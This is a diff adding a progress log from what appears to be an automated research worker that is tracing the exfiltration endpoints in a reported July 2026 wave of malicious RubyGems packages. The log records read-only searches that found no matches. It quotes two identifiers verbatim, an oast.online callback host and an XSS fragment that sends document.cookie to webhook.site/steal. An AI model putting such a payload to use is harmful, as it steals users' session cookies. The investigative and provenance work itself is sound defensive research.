@@ -1,0 +1,39 @@
+# Exfil-endpoint pivot — lane 12 progress log
+
+Worker 3 of the off-task web-mechanism hunt. Read-only. No requests were sent
+to oast.online / webhook.site / burpcollaborator endpoints at any point.
+
+- 2026-09-28 ~19:30 CDT: read ExploitGym synthesis + analyst notes; scoped the
+  July-7 wave (JFrog: 215 pkgs / 333 releases, 2026-07-07 03:03:09-18:13:42 UTC).
+- Verified our Diffend July-7 sweep (`data/july7-wave/`) holds metadata only
+  (18/264 in_diffend; none of the XSS exfil gems found); hosted ES
+  `july7-wave` confirmed read-only as sweep metadata (264 docs, record_kind
+  diffend_sweep_july7, no payload bytes).
+- Fetched JFrog report (https://research.jfrog.com/post/gemstuffer-openai-rubygems/)
+  2026-09-28; extracted 2 exfil identifiers verbatim:
+  EXFIL-001 `d96877a5q295v25se560q7ntmmwky7x8o.oast.online/admin-xss-author`
+    (attacker-xss-admin-1@0.0.1, author field)
+  EXFIL-002 `https://webhook.site/steal?c='+document.cookie`
+    (xssname-1783397821@0.0.1, author field)
+  Plus 3 non-exfil records (alert(1) PoC, SSTI probes, xss-test-gem description).
+- Repo-wide fixed-string grep for all identifiers: hits ONLY in the JFrog
+  report and its saved copy (`data/separate-eval-test/sources/jfrog-gemstuffer-post.html`).
+  Prior webhook-deaddrops lane's full-repo negative (no oast.online/webhook.site
+  in corpus content) corroborates.
+- Hosted ES (read-only surrogate, per scripts/audit_gem_counts.py):
+  `rubygems-goimport-campaign` -> 0 hits for all 4 identifier strings;
+  `july7-wave` -> metadata only.
+- urlquery.io public search (uq.py, read-only): verbatim oast ID 0 hits;
+  `webhook.site/steal` 0 hits; generic `oast.online` 234 hits (all unrelated
+  collaborator IDs); `http.url.addr:*webhook.site*` 208 hits (unrelated UUID
+  inboxes, CTF writeups). Raw JSONs in raw/.
+- Public web search: identifiers appear only in the JFrog report itself.
+- sourcegraph public code search (reachable 2026-09-28, was unreachable in
+  prior lanes): 0 matches for both identifiers incl. archived+fork scopes.
+  grep.app: HTTP 429 (rate-limited), still unusable.
+- Checked sibling xss-ssti-census (122 payloads, 22 july7-gem-wave rows):
+  zero oast.online/webhook.site occurrences in payload text; july7 rows have
+  no payload bytes (Diffend-verified absent).
+- Wrote PROVENANCE.md, identifiers.jsonl, this log; built SHA256SUMS.
+- Note for orchestrator: commit + push with explicit pathspecs only;
+  hidden_files/lane12 left unused/unstaged.
